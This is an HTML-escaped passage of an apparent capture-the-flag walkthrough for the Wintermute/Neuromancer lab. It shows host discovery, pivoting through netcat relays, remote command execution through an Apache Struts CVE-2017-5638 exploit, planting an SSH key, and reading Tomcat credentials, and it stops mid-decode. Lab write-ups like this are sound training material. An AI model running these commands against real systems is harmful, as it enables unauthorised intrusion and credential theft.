        TX packets 26  bytes 3762 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.6 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;73&amp;lt;UP,LOOPBACK,RUNNING&amp;gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&amp;lt;host&amp;gt;
        loop  txqueuelen 1  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local Loopback&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX packets 19907  bytes 2079525 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.9 MiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19907  bytes 2079525 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.9 MiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;information-gathering-1&quot;&gt;Information Gathering&lt;/h2&gt;
&lt;h3 id=&quot;host-discovery-1&quot;&gt;Host Discovery&lt;/h3&gt;

&lt;p&gt;We discovered our next target &lt;strong&gt;192.168.56.104&lt;/strong&gt; on another network with the following bash oneliner.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@straylight:/tmp# &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;n &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1 255&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 192.168.56.&lt;span class=&quot;nv&quot;&gt;$n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp;/dev/null &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Host 192.168.56.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; up&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&amp;lt;/dev/null &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Host 192.168.56.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; up&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Host 192.168.56.1 up
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Host 192.168.56.100 up
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Host 192.168.56.104 up
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Host 192.168.56.105 up
root@straylight:/root#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;port-scanning-1&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;p&gt;I developed a python port scanner to discover open ports.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3 
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;192.168.56.104&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;scan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;65535&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Port {} open&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We start a web server with python on port 80.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On target machine we download the port scanner, give it execution permissions and execute it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@straylight:/root# wget 192.168.179.1/pscan.py

root@straylight:/root# &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x pscan.py
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x pscan.py
root@straylight:/root# ./pscan.py
./pscan.py
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Port 8009 open
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Port 8080 open
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Port 34483 open
root@straylight:/root#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;service-enumeration-1&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;p&gt;We check the banner on port 8009 with telnet but the service was not detected.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@straylight:/root# telnet 192.168.56.104 8009
telnet 192.168.56.104 8009
Trying 192.168.56.104...
Connected to 192.168.56.104.
Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

Connection closed by foreign host.
root@straylight:/root#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The banner reveals that a web server is running on port 8080.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@straylight:/root# telnet 192.168.56.104 8080
telnet 192.168.56.104 8080
Trying 192.168.56.104...
Connected to 192.168.56.104.
Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
HEAD / HTTP/1.0

HTTP/1.1 200 
Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UTF-8
Date: Wed, 26 Jan 2022 01:32:08 GMT
Connection: close

Connection closed by foreign host.
root@straylight:/root# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And on port 34483 we see that SSH is running.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@straylight:/root# telnet 192.168.56.104 34483
telnet 192.168.56.104 34483
Trying 192.168.56.104...
Connected to 192.168.56.104.
Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4


Protocol mismatch.
Connection closed by foreign host.
root@straylight:/root#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;web-enumeration-on-port-8080&quot;&gt;Web Enumeration on port 8080&lt;/h3&gt;

&lt;p&gt;To set up a netcat relay for pivoting we execute the following commands.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@straylight:/root# &lt;span class=&quot;nb&quot;&gt;mknod&lt;/span&gt; /tmp/backpipe p 
root@straylight:/root# nc &lt;span class=&quot;nt&quot;&gt;-lp&lt;/span&gt; 8080 &amp;lt; /tmp/backpipe | nc 192.168.56.104 8080 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/backpipe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This establishes a netcat listener on port 8080, the netcat listener pipes any traffic it receives to the netcat client which forwards the traffic to port 8080 on the target web server 192.168.56.104.&lt;/p&gt;

&lt;p&gt;Now on the attacking machine we can browse the tomcat web page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/wintermute/screenshot-10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we remember the directory into the note, so we browse on it.&lt;/p&gt;

&lt;p&gt;http://192.168.56.104:8080/struts2_2.3.15.1-showcase&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/wintermute/screenshot-11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Struts version 2.3.15 is vulnerable to Remote Code Execution&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit struts 2.3.15
&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                                                                |  Path
&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Apache Struts 2.0.1 &amp;lt; 2.3.33 / 2.5 &amp;lt; 2.5.10 - Arbitrary Code Execution                                        | multiple/remote/44556.py
Apache Struts 2.3 &amp;lt; 2.3.34 / 2.5 &amp;lt; 2.5.16 - Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                         | linux/remote/45260.py
Apache Struts 2.3 &amp;lt; 2.3.34 / 2.5 &amp;lt; 2.5.16 - Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                         | multiple/remote/45262.py
Apache Struts 2.3.5 &amp;lt; 2.3.31 / 2.5 &amp;lt; 2.5.10 - &lt;span class=&quot;s1&quot;&gt;'Jakarta'&lt;/span&gt; Multipart Parser OGNL Injection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Metasploit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;          | multiple/remote/41614.rb
Apache Struts 2.3.5 &amp;lt; 2.3.31 / 2.5 &amp;lt; 2.5.10 - Remote Code Execution                                           | linux/webapps/41570.py
Apache Struts &amp;lt; 1.3.10 / &amp;lt; 2.3.16.2 - ClassLoader Manipulation Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Metasploit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             | multiple/remote/41690.rb
Apache Struts2 2.0.0 &amp;lt; 2.3.15 - Prefixed Parameters OGNL Injection                                            | multiple/webapps/44583.txt
&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We copy the exploit to our current directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; linux/webapps/41570.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;exploitation-1&quot;&gt;Exploitation&lt;/h2&gt;
&lt;h3 id=&quot;remote-code-execution&quot;&gt;Remote Code Execution&lt;/h3&gt;

&lt;p&gt;Apache Struts 2 versions 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 remote code execution exploit that provides a reverse shell.&lt;/p&gt;

&lt;p&gt;We run the script adding as parameter the URL and the id command.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; CVE: 2017-5638 - Apache Struts2 S2-045
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; cmd: &lt;span class=&quot;nb&quot;&gt;id

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ta&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ta&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ta&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,24&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cdrom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,30&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,46&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plugdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,110&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lxd&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,115&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lpadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,116&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sambashare&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The command was successfully executed, we can try to get a reverse shell, but I prefer to access via SSH.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action &lt;span class=&quot;s2&quot;&gt;&quot;mkdir /home/ta/.ssh&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We generate the SSH key pair.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh-keygen &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ta123&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; id_rsa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We create the authorized_keys file with the the public key inside the ssh directory in the ta’s home directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action &lt;span class=&quot;s2&quot;&gt;&quot;echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXzybvylP8i
qZivblk2Ezss0lYM4TsTMscRB1Hy9cy2r6Z4lXUv1Z5Y2cEuha/9YQ6O1w51f3iCBtWQUi+feKvlqhL6q8FEsF3ju4cdiD87rMPOHia1M4MYJoU4CEcN8Y8u1IN35Uvn+NBz+rad2ESwlbvsa3dBotTHWGvLR140HE1k
qzrejm2z42DSE356qkY2I4+2xLoHtfQiIAVPl5p9YGcjwDs4NWeYFRZ8RbMYnW7pVD6Bj+hQedOn9uPM+wm1dUh+ZiEwgGFSeeKWvfR7N0LQ69+YhK0gAPY//6NiK300UFpGWW6D+RNyAq9+3zovqini3XPfnfLrhHtG
vMbuN4Yzp9+g8N7Pz8nWXBLo/V3Yufxw99j7y3Rwj4LUVrGqWi7HUkQFSK/kIzUU81wJ54x+JrtToBuXIFl57fXz23NfBLsJMIIjYykTmbUGaTDWpmm2fRoCMdGQmr3EASDpvzuZSNsvVr5wqCSQ0CrJ3+NM3sKEqwZR
ItFaad4mhE= &amp;gt; /home/ta/.ssh/authorized_keys&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We grant read and write permissions to the owner of the authorized_keys file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action &lt;span class=&quot;s2&quot;&gt;&quot;chmod 600 /home/ta/.ssh/authorized_keys&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We execute the following commands to set up a netcat relay to pivot as shown previously.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@straylight:/root# &lt;span class=&quot;nb&quot;&gt;mknod&lt;/span&gt; /tmp/backpipe2 p
root@straylight:/root# nc &lt;span class=&quot;nt&quot;&gt;-lp&lt;/span&gt; 34483 &amp;lt; /tmp/backpipe2 | nc 192.168.56.104 34483 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/backpipe2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We access via SSH as user ta.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; ta 192.168.56.104 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 34483 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa
The authenticity of host &lt;span class=&quot;s1&quot;&gt;'[192.168.56.104]:34483 ([192.168.56.104]:34483)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
ECDSA key fingerprint is SHA256:oUL2wjfAFRqayjqOgc79xVYeSqvD92zqaV+4udNxJrw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.104]:34483&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
 ----------------------------------------------------------------
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 ----------------------------------------------------------------
Enter passphrase for key '&lt;/span&gt;id_rsa&lt;span class=&quot;s1&quot;&gt;': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
44 updates are security updates.


Last login: Tue Jul  3 21:53:25 2018
ta@neuromancer:~$
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We execute the find command to locate the tomcat-users.xml file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ta@neuromancer:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'tomcat-users.xml'&lt;/span&gt; 2&amp;gt;/dev/null | xargs &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;
...
&amp;lt;user &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Lady3Jane&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;gt;&amp;amp;#33;&amp;amp;#88;&amp;amp;#120;&amp;amp;#51;&amp;amp;#74;&amp;amp;#97;&amp;amp;#110;&amp;amp;#101;&amp;amp;#120;&amp;amp;#88;&amp;amp;#33;&amp;amp;lt;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;roles&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;manager-gui&quot;&lt;/span&gt;/&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, Lady3Jane’s password is encoded in HTML, we decode to plain text using the hURL utility.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hURL &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;gt;&amp;amp;#33;&amp;amp;#88;&amp;amp;#120;&amp;amp;#51;&amp;amp;#74;&amp;amp;#97;&amp;amp;#110;&amp;amp;#101;&amp;amp;#120;&amp;amp;#88;&amp;amp;#33;&amp;amp;lt;&quot;&lt;/span&gt;

